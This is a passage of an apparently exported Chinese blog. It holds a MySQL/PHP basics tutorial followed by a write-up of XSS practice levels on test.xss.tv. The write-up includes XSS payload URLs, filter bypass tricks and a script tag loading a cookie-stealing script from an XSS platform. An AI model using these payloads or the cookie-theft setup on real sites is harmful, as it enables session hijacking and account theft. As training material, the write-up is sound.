表名(字段1,字段2,字段3,...,字段n) values(值1,值2,值3,...,值n); 也可以不用指定字段名，但是values后面的顺序应该和字段的排序一致 2&gt;一次插入多条记录 insert into 表名(字段1,字段2,字段3,...,字段n)values(值1,值2,值3,...,值n),(值1,值2,值3,...,值n),(值1,值2,值3,...,值n); 2)更新记录 1&gt;更新一个表 update 表名 set 字段1=值1,字段2=值2,...字段n=值n [where 条件]; 2&gt;更新多个表中数据 update 表1,表2,...表n set 表1.字段1=表达式1,表n.字段n=表达式n [where 条件]; 注：多表更新更多的用在根据一个表的字段来动态的更新另外一个表的字段简单实例： update t1,t2 set t1.age=2000,t2.age=3000 where t1.id=1 and t2.id=1; 3)删除记录 1&gt;删除单表中的数据 delete from 表名 [where 条件]; 2&gt;删除多个表中的数据 delete 表1,表2,...表n from 表1,表2,...表n [where 条件]; 不管是单表还是多表，不加where条件将会把表中的所有记录删除，所以操作时一定要小心。 4)查询记录 select 字段名 from 表名; mysql&gt; use demo;Database changedmysql&gt; select username from users;+----------+| username |+----------+| admin || 69 |+----------+2 rows in set (0.00 sec) 1&gt;查询不重复的记录 SELECT distinct field1,field2 FROM 表名; mysql&gt; select distinct id,username from users;+---------+----------+| id | username |+---------+----------+| 1739701 | admin || 1739702 | 69 |+---------+----------+2 rows in set (0.00 sec) 只要field1,field2任何一个字段有不同就会被选择，一般使用distinct,只筛选一个字段。 2&gt;条件查询注：条件字段比较符号： =,&lt;,&gt;,&gt;=,&lt;=,!=等比较运算符 多个条件之间可以使用or and等 where 后面接条件 select * from 表名 where 条件 3&gt;排序和限制排序:asc:由低到高，也是默认值 select * from 表名 order by 字段名 asc; #按“字段名”由低到高排序 desc:由高到底 select * from 表名 order by 字段名 desc;#按“字段名”由高到低排序 例： mysql&gt; select * from users order by id desc;+---------+----------+----------+| Id | username | password |+---------+----------+----------+| 1739702 | 69 | 69 || 1739701 | admin | admin |+---------+----------+----------+2 rows in set (0.00 sec) 多个字段排序 select * from 表名 order by 字段名1 desc,字段名2 desc; 限制:在语句的最后面 加上limit 数字1,数字2 来进行查询数量的限制。limit 数字1,数字2 数字1代表从第几条记录开启取(是从0开始的)，数字2代表取几条 例： mysql&gt; select * from users order by id desc limit 0,1;+---------+----------+----------+| Id | username | password |+---------+----------+----------+| 1739702 | 69 | 69 |+---------+----------+----------+1 row in set (0.00 sec) 4&gt;聚合 ①sum求和 select sum(字段名) from 表名; ②count记录总数 select count(|字段名) from 表名; ③max最大值 select max(字段名) from 表名; ④min最小值 select min(字段名) from 表名; ⑤GROUP BY分类聚合 select 字段2,sum(字段1) from 表名 group by 字段2; 按照字段2，分类聚合 ⑥WITH ROLLUP分类聚合后的结果进行再汇总 select sum(字段1) from 表名 group by 字段2 with rollup; ⑦HAVING 注意：having和where的区别在于，having是对聚合后的结果进行条件过滤，而where是在聚合前就对记录进行过滤 ，应该尽可能的对记录进行先过滤.。 select sum(字段1) from 表名 group by 字段2 having sum(字段1)&gt;1000;可以在一起使用：select sum(id),max(id),min(id),count() from a1; 5&gt;表连接需求：显示多个表中的字段的时候即可使用表连接连接分类： 内连接：选取两张表中相互匹配的记录 外连接：不仅仅选取两张相互匹配的记录，并且会选出其他不匹配的记录举例：内连接： select 表.字段,.... from 表1名,表2名,... where [匹配的条件比如 表1.字段=表2.字段]; 例： mysql&gt; select*from user,student where user.id=student.id;+----+-------+----------+----+------+------+| Id | name | password | Id | sex | ming |+----+-------+----------+----+------+------+| 1 | ad | ad | 1 | wa | wang || 2 | admin | admin | 2 | me | meng || 3 | root | root | 3 | ng | meng |+----+-------+----------+----+------+------+3 rows in set (0.00 sec) mysql&gt; select user.id,user.name,student.sex from user,student where user.id=student.id;+----+-------+------+| id | name | sex |+----+-------+------+| 1 | ad | wa || 2 | admin | me || 3 | root | ng |+----+-------+------+3 rows in set (0.00 sec) select 语句可以给字段起别名!直接写在需要查询显示的字段的后面就ok​ 给表起别名 例： mysql&gt; select user.id a,student.id b from user,student where user.id=student.id;+---+---+| a | b |+---+---+| 1 | 1 || 2 | 2 || 3 | 3 |+---+---+3 rows in set (0.00 sec) 外连接​1)左连接(left)：包含左边表中的所有记录(包括右表中没有和它匹配的记录) select 表1,表2 from 表1 left join 表2 on 表1.字段名=表2.字段名; 2)右连接(right)：包含右边表中的所有记录(包括左表中没有和它匹配的记录)​ 左连接和右连接是可以相互转换的6&gt;子查询需求：一个查询需要另外一个查询的结果参与的时候​用于子查询的关键字:​in​语法：select * from 表1 where id in(select 字段名 from 表2);​in 在..里面​注意点 in后面的子语句必须只返回一个字段​若查询结果唯一(只有一条)可以使用=代替in not in​与in相反​exists​语法：select语句 where exists(select 语句);​exists：后面那个子语句有没有查询出记录来，如果查询出记录来返回true,否则就是false​并且查询出来的记录的具体的值是NULL也是没有关系,也是返回true.​not exits​与exists相反​ 1)select from 表1 where 表2 in(select 表2 from 字段名);​ 2)若查询结果唯一可以使用=代替in​ select from 表1 where 表2=(select 表2 from 字段名 limit 1);7&gt;记录联合我们常常会碰到需要将两个表或者多个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示这是就需要用到记录联合多个select 语句用UNION或者UNION ALL隔开即可实现 例： mysql&gt; select id,name from user union select id,sex from student;+----+-------+| id | name |+----+-------+| 1 | ad || 2 | admin || 3 | root || 4 | wang || 1 | wa || 2 | me || 3 | ng |+----+-------+7 rows in set (0.00 sec) 区别： 前者 会将多个查询结果合并后并且进行去除重复后返回​ 后者 则直接合并并不去除重复联合的条件：查询的列个数要相等 四、MySQL数据库字符编码1、字符编码概述 从本质上来说，计算机只能识别二进制代码，因此，不论是计算机程序还是其他被处理的数据，最终都必须转换成二进制，计算机才能认识。为了使计算机不仅能做科学计算，也能处理文字信息，人们想出了给每个文字符号编码以便于计算机识别处理，这就是计算机字符集的由来。 简单的说字符集就是一套文字符号及编码、比较规则的集合。 2、汉字常见字符集 1.GB2312-80:即GB2312，是中华人民共和国国家标准简体中文字符集，全称《信息交换用汉字编码字符集 基本集》，1980年发布，1981年5月1日实施。GB2312编码通行于中国大陆，中国大陆几乎所有的中文系统和国际化的软件都支持GB 23122.GBK： 汉字内码扩展规范，发布于1995年，在GB2312的基础上做了扩充，且对GB2312完全兼容，但是GBK并不是一个强制性的国家标准，只是一个行业指导规范，并没有强制力，但是由于得到了微软windows95的支持而大为流行 3、国际编码UTF-8 是一种针对Unicode的可变长度字符编码，通用性很好。 4、常用字符集比较 ACSII：单字节7位编码，最早的奠定性字符集ISO-8859-1/latin1：单字节8位编码，西欧字符集GB2312-80：双字节编码，早期标准GBK：双字节编码，虽然不是国标但是支持的系统很多UTF-32：4个字节编码，UCS-4原始编码，目前很少采用UCS-2：2字节编码，windows2000内部用UCS-2UTF-16：2字节或4字节编码，Java和Windows XP/NT等内部使用UTF-16UTF-8：1~4字节编码，互联网和Unix/Linux广泛支持的Unicode字符集,UTF-8汉字编码需要使用3个字节 5、MySQL支持的字符集 1.查看所有可用的字符集show character set;或者查看information_schema.character_sets，也可以显示所有的字符集和该字符集默认的校队规则 2.MySQL的字符集包括字符集(character)和校对规则(collation)两个概念。1)字符集用来定义MySQL存储字符串的方式2)校对规则用来定义 字符串比较的方式3)字符集和校对规则是一对多的关系,一个字符集有多个校对规则供你选择!校对规则命名约定：它们以相关的字符集名开始，通常包括一个语言名，并且以 _ci(忽略大小写)、_cs(大小写敏感)或者 _bin(二元，即比较是基于字符编码的值而与language无关)结束。查看字符集的校对规则：show collation like ‘字符集前缀%’; 6、MySQL内部的字符集和校对规则设置 MySQL内部的字符集和校对规则有4个级别的默认设置:服务器级、数据库级、表级和字段级1.服务器字符集和校对规则设置1)在配置文件中设置 [mysqld]character-set-server=utf8 2)或者在启动项中指定 mysqld --character-set-server=utf8 3)或者在编译的时候指定2.数据库字符集和校对规则设置数据库的字符集和校对规则在创建数据库的时候指定，也可以在创建完数据库后通过alter database命令修改.需要注意的是如果数据库里已经有数据存在，因为修改字符集并不能将已有的数据按照新的字符集进行存放，所以不能通过修改数据库的字符集直接修改数据的内容，需要重新导出，然后修改字符编码再导入来解决！设置数据库字符集的规则如下：1)如果指定了字符集和校对规则，则使用指定的字符集和校对规则2)如果指定了字符集没有指定校对规则，则使用指定字符集的默认校对规则3)如果指定了校对规则但未指定字符集，则使用与该校对规则关联的字符集4)如果没有指定字符集和校对规则，则使用服务器字符集和校对字符集和校对规则作为数据库的字符集和校对规则 CREATE DATABASE db_name[[DEFAULT] CHARACTER SET charset_name][[DEFAULT] COLLATE collation_name] ALTER DATABASE db_name[[DEFAULT] CHARACTER SET charset_name][[DEFAULT] COLLATE collation_name] 查看当前数据库的字符集和校对规则： show variables like 'character_set_database';show variables like 'collation_database'; 3.表字符集和校对规则设置 表的字符集和校对规则在创建表的时候指定，也可以通过alter table 命令进行修改，同样的是如果表中已经有数据那么修改字符集对原来的记录并没有影响，不会按照新的字符集进行存放！ 设置表字符集的规则如下： 1)如果指定了字符集和校对规则，则使用指定的字符集和校对规则 2)如果指定了字符集没有指定校对规则，则使用指定字符集的默认校对规则 3)如果指定了校对规则但未指定字符集，则使用与该校对规则关联的字符集 4)如果没有指定字符集和校对规则，则使用数据库字符集和校对字符集和校对规则作为表的字符集和校对规则 CREATE TABLE tbl_name (column_list)[DEFAULT CHARACTER SET charset_name [COLLATE collation_name]] ALTER TABLE tbl_name[DEFAULT CHARACTER SET charset_name] [COLLATE collation_name] 4.字段(列)字符集和校对规则 遇到这种情况概率比较小，这只是MySQL提供给我们一个灵活设置的手段 7、MySQL连接字符集设置 连接字符集设置：客户端和服务器之间交互的字符集对于客户端和服务器段的交互操作，MySQL提供了3个不同的参数：1)character_set_client：客户端来源数据使用的字符集2)character_set_connection：连接层字符集3)character_set_results：返回结果字符集知识拓展：数据在客户端和服务器之间交互的过程中字符集转换的大概过程1) MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；2) 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，内部操作字符集的确定方法如下： 1&gt;使用每个数据字段设定的字符集； 2&gt;若上述值不存在，则使用对应数据表设定的字符集； 3&gt;若上述值不存在，则使用对应数据库设定的字符集； 4&gt;若上述值不存在，则使用服务器设定的字符集。3) 将操作结果从内部操作字符集转换为character_set_results。这3个参数设定的字符集应该相同，并且客户端使用的字符集确实是参数character_set_client的值，才可以确保用户的数据可以正确的返回且输出。查看当前设置：show variables like &#39;character_set%&#39;;修改：set names 字符集，可以同时修改3个参数的值，对本次有效也可以在配置文件中设置： [mysql] default-character-set=字符集修改CMD命令行字符集： chcp 65001 #换成utf-8代码页（设置为utf-8之后最好手动修改显示字体 ） chcp 936 #换成默认的gbk 五、MySQL中的常见运算符和常用函数常见运算符1.算数运算符 运算符 作用 + 加法 - 减法 * 乘法 /,DIV 除法，返回商 %,MOD 取余数 2.比较运算符 运算符 作用 = 等于 &lt;&gt;或!= 不等于 &lt;=&gt; 可以用于null值的比较 &lt; 小于 &lt;= 小于等于 > 大于 >= 大于等于 BETWEEN 存在指定范围 IN 存在于指定集合 IS NULL 为NULL IS NOT NULL 不为NULL LIKE 通配符匹配 REGEXP或RLIKE 正则表达式匹配 3.逻辑运算符 逻辑运算符又称为布尔运算符，用来确认表达式的真和假 运算符 作用 NOT或! 逻辑非 AND或&amp;&amp; 逻辑与 OR或|| 逻辑或 XOR 逻辑异或 4.运算符的优先级 在实际运行的时候，实际上很少有人能够将运算符的优先级熟练记忆 很多情况下我们都是用“()”来将需要优先的操作括起来，这样既起到了优先的作用，又使得其他用户看起来更易于理解 常用函数函数用于SQL语句中1.字符串函数CONCAT(S1,S2,…Sn) 连接S1,S2,…Sn为一个字符串INSERT(str,x,y,instr) 将字符串str从第x位置开始，y个字符长的字符串换位字符串instrLOWER(str) 将字符串str中所有字符变为小写UPPER(str) 将字符串str中所有字符变为大写LEFT(str,x) 返回字符串str最右边的x个字符RIGHT(str,x) 返回字符串str最右边的x个字符LPAD(str,n,pad) 用字符串pad对str最左边进行填充，直到长度为n个字符长度RPAD(str,n,pad) 用字符串pad对str最右边进行填充，直到长度为n个字符长度LTRIM(str) 去掉字符串str左侧的空格RTRIM(str) 去掉字符串str行尾的空格REPEAT(str,x) 返回str重复x次的结果REPLACE(str,a,b) 用字符串b替换字符串str中所有出现的字符串aSTRCMP(s1,s2) 比较字符串s1和s2TRIM(str) 去掉字符串行尾和行头的空格SUBSTRING(str,x,y) 返回从字符串str x位置起y个字符长度的字符串LENGTH(str) 返回字符串长度2.数值函数ABS(x) 返回x的绝对值CEIL(x) 返回大于x的最小整数值FLOOR(x) 返回小于x的最大整数值MOD(x,y) 返回x/y的模RAND() 返回0-1内的随机值ROUND(x,y) 返回参数x的四舍五入的有y位小数的值TRUNCATE(x,y) 返回数字x截断为y位小数的结果3.日期和时间函数CURDATE() 返回当前日期CURTIME() 返回当前时间NOW() 返回当前的日期和时间UNIX_TIMESTAMP(date) 返回日期date的UNIX时间戳FROM_UNIXTIME() 返回UNIX时间戳的日期值WEEK(date) 返回日期date为一年中的第几周YEAR(date) 返回日期date的年份HOUR(time) 返回time的小时值MINUTE(time) 返回time的分钟值MONTHNAME(date) 返回date的月份名DATE_FORMAT(date,fmt) 返回按字符串fmt格式化日期date值DATE_ADD(add,INTERVAL expr type) 返回一个日期或时间值加上一个时间间隔的时间值DATEDIFF(expr,expr2) 返回起始时间expr和结束时间expr2之间的天数4.流程函数1)IF(value,t,f) 如果value是真，返回t,否则返回f select if(field1&gt;1000,’高薪’,’低薪’);2)IFNULL(value1,value2) 如果value1不为null，返回value1，否则value1该是什么还是什么 select ifnull(name,’无名’);3)CASE WHEN [value1] THEN [result1]…ELSE[default]END 如果value1是真，返回result1，否则返回default select case when 100&gt;10 then ‘真’ else ‘假’ end; 和if语句比较像4)CASE [expr] WHEN [value1] THEN[result1]…ELSE[default]END 如果expr等于value1，返回result1，否则返回default select case 1 when 1 then ‘一’ when 2 then ‘二’ when 3 then ‘三’ else ‘未知数字’end; 和switch语句比较像5.其他常用函数 用法：select 函数名; DATABASE() 返回当前数据库名VERSION() 返回当前数据库版本USER() 返回当前登录用户名INET_ATON(IP) 返回IP地址的数字表示INET_NTOA(num) 返回数字代表的IP地址PASSWORD(str) 返回字符串str的加密版本MD5() 返回字符串str的MD5值 六、mysqli与MySQL交互1.建立、关闭与MySQL服务器的连接1)连接指定的mysql服务器 $mysqli_connect=@mysqli_connect($host, $user, $password,$database,$port);//$port端口，默认3306 2)连接错误时的提示 int mysqli_connect_errno ();//返回最后一次连接调用的错误代码string mysqli_connect_error ();//返回一个字符串描述的最后一次连接调用的错误代码 3)设置默认字符编码 bool mysqli_set_charset ( mysqli $link , string $charset ) 4)选择特定的数据库 bool mysqli_select_db ( mysqli $link , string $dbname); 5)关闭与mysql服务器的连接 bool mysqli_close ( mysqli $link ); &lt;?phpheader('Content-type:text/html;charset=utf-8');//与MySQL建立连接$link=@mysqli_connect('localhost','root','root');//连接错误提示if(mysqli_connect_errno())&#123; exit(mysqli_connect_errno());&#125;//设置默认字符编码mysqli_set_charset($link,'utf8');//选择数据库mysqli_select_db($link,'myphp');//关闭与mysql服务器的连接mysqli_close($link);?&gt; 2.执行SQL语句1)对数据库执行一条SQL语句1&gt; mixed mysqli_query ( mysqli $link , string $query [, int $resultmode = MYSQLI_STORE_RESULT ] ); ​ ①对于insert，update，delete等不会返回数据的SQL语句，在执行没有错误时将返回true。​ ②对于返回数据的SQL语句执行成功的时候会返回结果集对象可以使用操作结果集对象的函数来从中获取数据​ ③MYSQLI_STORE_RESULT和MYSQLI_USE_RESULT决定了mysqli client和server之间取结果集的方式。​ MYSQLI_STORE_RESULT：执行SQL时提取结果集返回给client，并分配内存，存储到用户程序空间中,之后mysqli_fetch_array()​ 相当于是从本地取数据；而MYSQLI_USE_RESULT方式下，mysqli_fetch_array()每次都要向server请求结果行。​ MYSQLI_USE_RESULT：执行SQL的时候并没有从server将结果集取回2&gt;bool mysqli_real_query ( mysqli $link , string $query );​ 也可以使用本函数对数据库执行一条SQL语句，返回结果为布尔值，不返回结果集。​ 如果想获取结果集可以使用mysqli_store_result()获取结果集对象.3&gt;如果在执行SQL语句的时候发生错误，以上两个函数都将返回false，并且可以使用以下函数处理错误原因​ int mysqli_errno ( mysqli $link );​ string mysqli_error ( mysqli $link ); //对数据库执行一条SQL语句//$query='insert into t1(info) values(\"xiaoming\")';$query='select*from t1';$result=mysqli_query($link,$query); 2)操作结果集对象的函数1&gt;从结果集对象中解析数据的常见函数 ①以索引数组的方式获取一条记录的数据mixed mysqli_fetch_row ( mysqli_result $result );重复使用以获取下一条记录的数据 //以索引数组的方式获取一条记录的数据while ($data=mysqli_fetch_row($result))&#123; var_dump($data);&#125; ②以关联数组的方式获取一条记录的数据array mysqli_fetch_assoc ( mysqli_result $result );重复使用以获取下一条记录的数据 //以关联数组的方式获取一条记录的数据var_dump(mysqli_fetch_assoc($result));var_dump(mysqli_fetch_assoc($result));var_dump(mysqli_fetch_assoc($result));var_dump(mysqli_fetch_assoc($result));var_dump(mysqli_fetch_assoc($result)); ③以索引数组或关联数组的方式获取一条记录的数据mixed mysqli_fetch_array ( mysqli_result $result [, int $resulttype = MYSQLI_BOTH ] );重复使用以获取下一条记录的数据 //以索引数组或关联数组的方式获取一条记录的数据//第二个参数可选值：MYSQLI_ASSOC, MYSQLI_NUM, MYSQLI_BOTH(默认)var_dump(mysqli_fetch_array($result,MYSQLI_NUM)); ④以索引数组或关联数组的方式获取全部记录的数据mixed mysqli_fetch_all ( mysqli_result $result [, int $resulttype = MYSQLI_NUM ] ); mysqli_fetch_all($result); ⑤返回结果集中的下一个字段信息object mysqli_fetch_field ( mysqli_result $result ); //返回结果集中的下一个字段信息$filed=mysqli_fetch_field($result);var_dump($filed);echo $filed-&gt;orgname;//重复使用获取下一个字段var_dump(mysqli_fetch_field($result));var_dump(mysqli_fetch_field($result)); ⑥返回一个代表结果集字段的对象数组array mysqli_fetch_fields ( mysqli_result $result ); //返回一个代表结果集字段的对象数组var_dump(mysqli_fetch_fields($result));$fields=mysqli_fetch_fields($result);echo $fields[0]-&gt;name; ⑦获取结果中行的数量int mysqli_num_rows ( mysqli_result $result ); //获取结果中行的数量var_dump(mysqli_num_rows($result)); 注意：如果使用MYSQLI_USE_RESULT模式则必须在获取完所有的结果才可使用该函数。2&gt;释放与一个结果集相关的内存返回的结果集在数据量很大的时候需要很多的内存支持，所以在操作完结果集的时候有必要立刻释放与一个结果集相关的内存， 释放之后，结果集就不可用了void mysqli_free_result ( mysqli_result $result ); //释放与一个结果集相关的内存mysqli_free_result($result); 3)其他常用函数1&gt;获取前一个Mysql操作的受影响行数 int mysqli_affected_rows ( mysqli $link );2&gt;返回最后一次操作自动生成并使用的id mixed mysqli_insert_id ( mysqli $link );3&gt;转义用于SQL语句中的特殊字符防止SQL语句出错 string mysqli_real_escape_string ( mysqli $link , string $escapestr );4)一次性执行多条SQL语句,多个SQL语句用分号隔开 bool mysqli_multi_query ( mysqli $link , string $query ); 七、知识补充1.include语句 当一个文件被包含时，其中所包含的代码继承了 include 所在行的变量范围。从该处开始，调用文件在该行处可用的任何变量在被调用的文件中也都可用。 2.include_once语句 唯一区别是如果该文件已经被包含过，则不会再次包含。可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。 3.require语句 require 和 include 几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生致命错误。换句话说将导致脚本终止而 include 只产生警告信息，脚本会继续运行。 4.require_once语句 require_once 语句和 require 语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"开发","slug":"开发","permalink":"https://qwzf.gitee.io/blog/tags/开发/"},{"name":"PHP","slug":"PHP","permalink":"https://qwzf.gitee.io/blog/tags/PHP/"},{"name":"MySQL","slug":"MySQL","permalink":"https://qwzf.gitee.io/blog/tags/MySQL/"}],"author":"qwzf"},{"title":"XSS漏洞攻关(一)","slug":"XSS漏洞攻关(一)","date":"2019-04-28T09:00:44.187Z","updated":"2019-08-01T05:42:34.882Z","comments":true,"path":"2019/04/28/XSS漏洞攻关(一)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/04/28/XSS漏洞攻关(一)/","excerpt":"","text":"前言在了解xss之前，可以先了解一下下面这些内容 1.AJAX实现异步更新、跨域 2.常用命令document.write();`alert(“”);document.cookie;` 3.payload—意思为有效载荷，概念验证，即是漏洞验证脚本； Ajax跨域 1.允许单个域名访问 指定某域名跨域访问，只需在http://xx.com/xx.php文件头部添加如下代码： header('Access-Control-Allow-Origin:http://xx.com'); 2.允许所有域名访问 允许所有域名跨域访问，只需在http://xx.com/xx.php文件头部添加如下代码： header('Access-Control-Allow-Origin:*'); 3.允许多个域名访问 JS获取url 获取当前域名 方法一 var domain = document.domain; 方法二 var domain = window.location.host; 注意问题 由于获取到的当前域名不包括 http://，所以把获取到的域名赋给 a 标签的 href 时，别忘了加上 http://，否则单击链接时导航会出错。 其他想了解请看js获取当前域名、Url、相对路径和参数以及指定参数 Session &amp; Cookie cookie 数 据 存 放 在 客 户 的 浏 览 器 上 ， session 数 据 放 在 服 务 器 上 。 cookie 不 是 很 安 全 ， 别 人 可 以 分 析 存 放 在 本 地 的 COOKIE 并 进 行 COOKIE 欺 骗 。 考 虑 到 安 全 应 当 使 用 session 。 session 会 在 一 定 时 间 内 保 存 在 服 务 器 上 。 当 访 问 增 多 ， 会 比 较 占 用 你 服 务 器 的 性 能 考 虑 到 减 轻 服 务 器 性 能 方 面 ， 应 当 使 用 COOKIE 。 单 个 cookie 保 存 的 数 据 不 能 超 过 4K ， 很 多 浏 览 器 都 限 制 一 个 站 点 最 多 保 存 20 个 cookie 。 最大区别：一个存储在服务器端，一个存储在客户端 XSS介绍XSS攻击全称跨站脚本攻击(Cross Site Scripting)，XSS是一种在Web应用中的计算机安全漏洞，它允许恶意Web用户将代码植入到提供给其他用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。对于跨站脚本攻击，Hacker共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode” XSS攻击可能产生的危害 盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 盗窃企业重要的具有商业价值的资料 非法转账 强制发送电子邮件 网站挂马 控制受害者机器向其它网站发起攻击 XSS漏洞的分类1.DOM(本地利用)型：不经过服务器，通过修改页面的DOM节点形成的XSS 这种漏洞存在于页面中客户端脚本自身 攻击过程： ​ H给U发送一个恶意构造了Web的URL，U点击并查看了这个URL。恶意页面中的JavaScript打开一个具有漏洞的HTML页面并将其安装在U电脑上。具有漏洞的HTML页面包含了在U电脑本地域执行的JavaScript。H的恶意脚本可以在U的电脑上执行U所持有的权限下的命令。 2.存储型：经过服务器，存进数据库 ​ 该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，骇客将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。 攻击过程： ​ A拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。 H注意到A的站点具有存储式XXS漏洞， H发布一个热点信息，吸引其它用户纷纷阅读。 A或者是任何的其他人U浏览该信息，其会话cookies或者其它信息将被H盗走。 3.反射型：只是简单地把用户输入的数据反射给浏览器，简单来说，黑客往往需要用户诱使用户点击一个恶意链接，才能攻击成功 又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。类似存储式漏洞，不同的是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，客户端代码便能注入到动态页面中。 攻击过程： ​ U经常浏览某个网站A。U使用用户名/密码进行登录，并存储敏感信息(比如银行帐户信息)在网站A中。 H发现A站点包含反射性的XSS漏洞，编写一利用漏洞的URL，并将其冒充为来自A的邮件给U。 U在登录到A的站点后，浏览H供的URL。嵌入到URL中的恶意脚本在U的浏览器中执行，然后在U完全不知情的情况下将这些信息发送到H的Web站点。 X-XSS-Protectionheader(\"X-XSS-Protection:0\");//告诉服务器禁用XSS保护header(\"X-XSS-Protection:1\");//告诉服务器开启XSS保护 实例应用： 劫持访问 劫持访问就是在恶意脚本中插入诸如&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;的代码，那么页面就会跳转到百度首页。劫持访问在持久型和非持久型XSS中都比较常被利用。持久型XSS中劫持访问的危害不用说大家都清楚，但有人会问非持久型XSS中劫持访问有什么作用呢？很简单，试想下像qq.com，baidu.com这样的域名下出现非持久型XSS，那么在发送钓鱼链接时就可以通过qq.com等域名进行跳转，一般人一看到qq.com之类的域名警惕性会下降，也就更容易上当了。 盗用cookie实现无密码登录 由于盗取的cookie需要传回给攻击者，因此往往需要一个服务器来接收盗取的cookie，这也就是xss平台的作用了。网上的xss平台很多，但动手搭建一个也不难，建议有条件的自己搭建。 首先登录平台后台获取到js脚本地址为http://127.0.0.1/XSS/template/default.js，所以我们需要做的是把这段代码植入指定页面。 &lt;script type=\"text/javascript\" src=\"http://127.0.0.1/XSS/template/default.js\"&gt;&lt;/script&gt; 了解的差不多了，下面我开始去在线平台练习了。。。 XSS攻击常见利用方式​ 一般思路：普通注入–&gt;普通闭合注入(带&lt;input&gt;标签)–&gt;触发事件注入(特殊字符被过滤)–&gt;双关键字、大小写和超链接注入(触发事件的关键字被过滤)–&gt;HTML实体编码绕过–&gt;HTTP头流量包注入 下面都是我在在线平台上的练习。做题之后发现查看源码大法真的好。。。。 1.普通的GET型XSSLevel1 页面没有输入点，所以直接构造payload就行啦 http://test.xss.tv/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;&amp;submit=submit 该注入能产生说明程序员没有过滤或用引号包裹任何参数内容，也就是说后台代码直接解析执行参数值。这就造成在弱类型的语言中，原本是正常的字符串被当作代码执行，形成该XSS漏洞 2.带&lt;input&gt;标签的GET型XSSLevel2查看源码，发现 所以直接用双引号闭合value，然后构造payload http://test.xss.tv/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;submit=submit 选择在URL处直接注入代码，带&lt;input&gt;标签的GET型XSS和普通的GET型XSS最大的区别就是普通的GET型XSS的参数可以直接被解析，而带&lt;input&gt;标签的GET型XSS还需要闭合原本的input窗口，然后才能注入ShellCode 3.过滤特殊字符的GET型XSSLevel3 原先给的url是 http://test.xss.tv/level3.php?writing=wait 而查看源码发现 value里并没有属性值，因为表单提交里并没有name为writing的，所以把writing改为keyword。闭合value进行普通注入 发现过滤了尖括号 ，所以带有尖括号的ShellCode不能用了。所以在此换思路采用触发事件属性： http://test.xss.tv/level3.php?keyword=&apos;onclick=&apos;javascript:alert(1)&apos;&amp;submit=submit 注意：上面用的是onclick点击事件，所以还要点击一下输入框才会有弹窗 Level4 这道题和Level3的做法相同，查看源码发现，把单引号闭合value换成双引号闭合value就ok啦！ http://test.xss.tv/level3.php?keyword=&quot;onclick=&quot;javascript:alert(1)&quot;&amp;submit=submit 4.过滤关键字的GET型XSS当特殊字符都被过滤了，再考虑触发事件，触发事件的关键字也被过滤了，就要找哪些还没有被过滤 Level5 先使用触发事件测试一下 http://test.xss.tv/level5.php?keyword=\"onclick=\"javascript:alert(1)\" 然后查看源代码 &lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=\"\"o_nclick=\"javascript:alert(1)\"\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt; 发现onclick关键字中间被加了下划线。然后我选择使用双关键字和大小写进行绕过，结果没有成功。显然，这种是用双关键字和大小写绕过不了的。然后，我考虑了一下超链接 http://test.xss.tv/level5.php?keyword=\"&gt;&lt;a href=\"javascript:alert(1)\"&gt; 或者 http://test.xss.tv/level5.php?keyword=\"&gt;&lt;a href=\"javascript:alert(/xss/)\"&gt;点一下&lt;/a&gt;// 然后点击下面的蓝字，就成功了。 Level6 我考虑了一下用超链接测试 http://test.xss.tv/level6.php?keyword=\"&gt;&lt;a href=\"javascript:alert(1)\"&gt;点一下&lt;/a&gt;// 然后查看源代码 &lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=\"\"&gt;&lt;a hr_ef=\"javascript:alert(1)\"&gt;点一下&lt;/a&gt;//\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt; 发现href关键字中间被加了下划线。然后我再使用大小写进行绕过。将e大写 http://test.xss.tv/level6.php?keyword=\"&gt;&lt;a hrEf=\"javascript:alert(1)\"&gt;点一下&lt;/a&gt;// 然后点击蓝字就成功了。 Level7 将Level6的第二步大小写绕过，改为双写绕过就行了 http://test.xss.tv/level7.php?keyword=\"&gt;&lt;a hrhrefef=\"javascrscriptipt:alert(1)\"&gt;点一下&lt;/a&gt;// 5.HTML实体编码的GET型XSSHTML实体编码指的就是用unicode编码来代替关键字符或关键符号，&amp;、#、;不能被过滤。 Level8 首先我尝试在输入框里输入 javascript:alert(1) 查看源代码 &lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=\"javascript:alert(1)\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=\"javascr_ipt:alert(1)\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt; 发现关键字javascript被加上了下划线 这里就可以选择用实体编码了，将javascript的t或script进行实体编码javascrip&amp;#116;或 